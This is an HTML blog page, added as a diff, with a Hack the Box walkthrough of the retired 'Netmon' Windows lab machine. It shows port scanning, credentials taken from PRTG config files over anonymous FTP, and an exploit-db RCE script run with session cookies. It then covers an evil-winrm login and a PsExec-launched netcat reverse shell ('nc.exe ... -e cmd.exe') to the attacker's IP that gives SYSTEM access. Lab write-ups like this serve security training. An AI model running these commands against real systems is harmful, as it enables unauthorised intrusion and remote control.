@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>Hack the Box - Netmon - Calxus Blog</title>
+
+  <!-- Edit site and author settings in `_config.yml` to make the social details your own -->
+
+    <meta content="Calxus Blog" property="og:site_name">
+  
+    <meta content="Hack the Box - Netmon" property="og:title">
+  
+  
+    <meta content="article" property="og:type">
+  
+  
+    <meta content="Netmon is an easy difficulty Windows box with simple enumeration and exploitation. PRTG is running,and an FTP server with anonymous access allows reading of PRTG Network Monitor configuration files. The version of PRTG is vulnerable to RCE which can be exploited to gain a SYSTEM shell." property="og:description">
+  
+  
+    <meta content="http://localhost:4000/netmon-walkthrough/" property="og:url">
+  
+  
+    <meta content="2020-04-05T17:02:22+01:00" property="article:published_time">
+    <meta content="http://localhost:4000/about/" property="article:author">
+  
+  
+    <meta content="http://localhost:4000/assets/img/netmon.png" property="og:image">
+  
+  
+    
+    <meta content="HackTheBox" property="article:section">
+    
+  
+  
+    
+    <meta content="Easy" property="article:tag">
+    
+    <meta content="Windows" property="article:tag">
+    
+    <meta content="Retired" property="article:tag">
+    
+    <meta content="CVE" property="article:tag">
+    
+  
+  
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@TheCalxus">
+  
+    <meta name="twitter:title" content="Hack the Box - Netmon">
+  
+  
+    <meta name="twitter:url" content="http://localhost:4000/netmon-walkthrough/">
+  
+  
+    <meta name="twitter:description" content="Netmon is an easy difficulty Windows box with simple enumeration and exploitation. PRTG is running,and an FTP server with anonymous access allows reading of PRTG Network Monitor configuration files. The version of PRTG is vulnerable to RCE which can be exploited to gain a SYSTEM shell.">
+  
+  
+    <meta name="twitter:image:src" content="http://localhost:4000/assets/img/netmon.png">
+  
+
+	<meta name="description" content="Netmon is an easy difficulty Windows box with simple enumeration and exploitation. PRTG is running,and an FTP server with anonymous access allows reading of PRTG Network Monitor configuration files. The version of PRTG is vulnerable to RCE which can be exploited to gain a SYSTEM shell.">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta property="og:image" content="">
+	<link rel="shortcut icon" href="/assets/img/favicon/favicon.ico" type="image/x-icon">
+	<!-- Chrome, Firefox OS and Opera -->
+	<meta name="theme-color" content="#263959">
+	<!-- Windows Phone -->
+	<meta name="msapplication-navbutton-color" content="#263959">
+	<!-- iOS Safari -->
+	<meta name="apple-mobile-web-app-status-bar-style" content="#263959">
+	<!-- Google Fonts -->
+	<link href="https://fonts.googleapis.com/css?family=PT+Serif:400,700|Lato:300,400,700&display=swap" rel="stylesheet">
+	<!-- Font Awesome -->
+	<link rel="stylesheet" href="/assets/fonts/font-awesome/css/font-awesome.min.css">
+	<!-- Styles -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+</head>
+
+<body>
+
+  <div class="wrapper">
+    <aside class="sidebar">
+  <header>
+    <div class="about">
+      <div class="cover-author-image">
+        <a href="/"><img src="/assets/img/calxus.png" alt="Calxus"></a>
+      </div>
+      <div class="author-name">Calxus</div>
+      <p>DevOps Engineer with a penchant for pentesting and proud owner of an over-engineered home network</p>
+      <div style="height: 5px"></div>
+      <div class="author-name"><a href="/hackthebox">hack the box</a></div>
+      <div class="site-category"><a href="/homenetwork">home network</a></div>
+    </div>
+  </header> <!-- End Header -->
+  <footer>
+    <section class="contact">
+      <h3 class="contact-title">Contact me</h3>
+      <ul>
+        <li><a href="https://twitter.com/TheCalxus" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+        <li class="github"><a href="http://github.com/calxus" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li class="email"><a href="mailto:calxus@protonmail.ch"><i class="fa fa-envelope-o"></i></a></li>
+        <li><a href="https://hackthebox.eu/profile/317303" target="_blank"><i class="fa fa-cube"></i></a></li>
+      </ul>
+    </section> <!-- End Section Contact -->
+    <div class="copyright">
+      <p>2021 &copy; Calxus</p>
+    </div>
+  </footer> <!-- End Footer -->
+</aside> <!-- End Sidebar -->
+<div class="content-box clearfix">
+  <article class="article-page">
+  <div class="page-content">
+    
+    <div class="page-cover-image">
+      <figure>
+        <img class="page-image" src=/assets/img/netmon.png alt="Hack the Box - Netmon">
+        
+          <figcaption>Netmon</figcaption>
+        
+      </figure>
+    </div> <!-- End Page Cover Image -->
+    
+    <div class="wrap-content">
+      <header class="header-page">
+        <h1 class="page-title">Hack the Box - Netmon</h1>
+        <div class="page-date"><span>2020, Apr 05&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
+      </header>
+      <h2 id="overview">Overview</h2>
+<p>Netmon is an easy difficulty Windows box with simple enumeration and exploitation. PRTG is running,and an FTP server with anonymous access allows reading of PRTG Network Monitor configuration files. The version of PRTG is vulnerable to RCE which can be exploited to gain a SYSTEM shell.</p>
+<h2 id="enumeration">Enumeration</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
+└─$ sudo nmap -p- -T4  10.129.113.107  
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 18:15 GMT
+Nmap scan report for 10.129.113.107
+Host is up (0.017s latency).
+Not shown: 65522 closed ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+</code></pre></div></div>
+<p>From the initial scan the ports that seem of immediate interest are 21 and 80. When attempting to connect to the FTP server, anonymous access is allowed and gives user access to the filesystem.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
+└─$ ftp 10.129.113.107
+Connected to 10.129.113.107.
+220 Microsoft FTP Service
+Name (10.129.113.107:calxus): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-03-19  12:18AM                 1024 .rnd
+02-25-19  10:15PM       &lt;DIR&gt;          inetpub
+07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs
+02-25-19  10:56PM       &lt;DIR&gt;          Program Files
+02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)
+02-03-19  08:08AM       &lt;DIR&gt;          Users
+02-25-19  11:49PM       &lt;DIR&gt;          Windows
+226 Transfer complete.
+</code></pre></div></div>
+<p>When accessing the web server located on port 80 we find a login page for PRTG Network monitor.</p>
+<h2 id="foothold">Foothold</h2>
+<p>While googling for the location of credentials I found a reddit thread on the subject here: https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/ So with access to the file system via FTP I was able to navigate to the directory “C:\ProgramData\Paessler\PRTG Network Monitor”. From here there were three configuration files that I copied down and within “PRTG Configuration.old.bak” I was able to see the password.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;dbpassword&gt;
+	&lt;!-- User: prtgadmin --&gt;
+	PrTg@dmin2018
+&lt;/dbpassword&gt;
+</code></pre></div></div>
+<p>Frustratingly the password didn’t work, but as passwords are often only changed by 1 number I tried with 2019 and was able to get in. Searching exploitdb for RCE exploits I could find a script as shown below.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
+└─$ searchsploit prtg
+------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                           |  Path
+------------------------------------------------------------------------- ---------------------------------
+PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution     | windows/webapps/46527.sh
+PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                    | windows/webapps/49156.txt
+PRTG Network Monitor &lt; 18.1.39.1648 - Stack Overflow (Denial of Service) | windows_x86/dos/44500.py
+PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                  | java/webapps/34108.txt
+------------------------------------------------------------------------- ---------------------------------
+</code></pre></div></div>
+<p>Using this a user can be created on the box by grabbing the cookies from the authenticated session to the site</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
+└─$ ./prtg.sh -u http://10.129.113.107 -c "_ga=GA1.4.1726106620.1615746366; _gid=GA1.4.190225335.1615746366; OCTOPUS1813713946=ezdFQ0RERUNFLTFCQjYtNEI3MC1BMUVDLTI1MzgxMUU1MTM4Q30%3D; _gat=1"
+...
+ [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!
+</code></pre></div></div>
+<p>Once that has completed we can connect to the instance using “evil-winrm”</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
+└─$ evil-winrm -u 'pentest' -p 'P3nT3st!' -i 10.129.113.107
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+PS C:\Users\pentest\Documents&gt; whoami
+netmon\pentest
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Although we have an administrator user and this is enough to view the flags we can go a step further and gain system. To do this we copy over netcat and PsExec to the box using smb.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
+└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\pentest\Documents&gt; copy \\10.10.14.27\kali\PsExec.exe .
+PS C:\Users\pentest\Documents&gt; copy \\10.10.14.27\kali\nc.exe .
+PS C:\Users\pentest\Documents&gt; PsExec.exe -accepteula
+PS C:\Users\pentest\Documents&gt; .\PsExec.exe -i -s C:\Users\pentest\Documents\nc.exe -nv 10.10.14.27 4433 -e cmd.exe
+</code></pre></div></div>
+<p>After transferring the files and setting up the listener we can run the following command and be greeted with a system shell</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
+└─$ nc -nlvp 4433                                                                                                        130 ⨯
+listening on [any] 4433 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.113.107] 50475
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+</code></pre></div></div>
+
+      <div class="page-footer">
+        <div class="page-share">
+          <a href="https://twitter.com/intent/tweet?text=Hack the Box - Netmon&url=http://localhost:4000/netmon-walkthrough/" title="Share on Twitter" rel="nofollow" target="_blank">Twitter</a>
+          <a href="https://facebook.com/sharer.php?u=http://localhost:4000/netmon-walkthrough/" title="Share on Facebook" rel="nofollow" target="_blank">Facebook</a>
+          <a href="https://plus.google.com/share?url=http://localhost:4000/netmon-walkthrough/" title="Share on Google+" rel="nofollow" target="_blank">Google+</a>
+        </div>
+        <div class="page-tag">
+          
+            <a href="/tags#Easy" class="tag">&#35; Easy</a>
+          
+            <a href="/tags#Windows" class="tag">&#35; Windows</a>
+          
+            <a href="/tags#Retired" class="tag">&#35; Retired</a>
+          
+            <a href="/tags#CVE" class="tag">&#35; CVE</a>
+          
+        </div>
+      </div>
+    </div> <!-- End Wrap Content -->
+  </div> <!-- End Page Content -->
+</article> <!-- End Article Page -->
+
+</div>
+
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.0.0/dist/lazyload.min.js"></script>
+<script src="/assets/js/main.js"></script>
+
+</body>
+</html>
